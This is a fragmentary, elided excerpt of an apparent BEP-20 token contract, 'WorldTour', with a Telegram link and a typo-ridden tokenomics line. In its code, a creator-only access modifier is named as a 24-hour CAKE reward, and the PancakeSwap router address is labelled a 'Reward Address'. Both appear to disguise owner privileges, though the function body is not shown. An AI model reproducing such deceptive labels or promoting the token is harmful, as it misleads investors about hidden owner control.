...
Telegram: https://t.me/worldtourtoken

Tokenomics > 4% $CAKE REWARD (DESTRIBUTED EVERY 24 HOURS) , 1% MARKETING , 55 ADDED TO THE LIQUIDITY POOL
...
contract Context {
 ...
 contract WorldTour is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "WorldTour";
    string private _symbol = "WORLDTOUR";
    address private constant _RewardAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Pancakeswap Reward Address
    ...
    address private _Creator = 0x767FfD79cdfdF900498efDC5C32549efdeFD6926; // Creator Address - Renounce Ownership to lose all the function abilities
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    modifier Reward24HourCake () {
        require(_Creator == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
    
    function ManualCake() public Reward24HourCake {
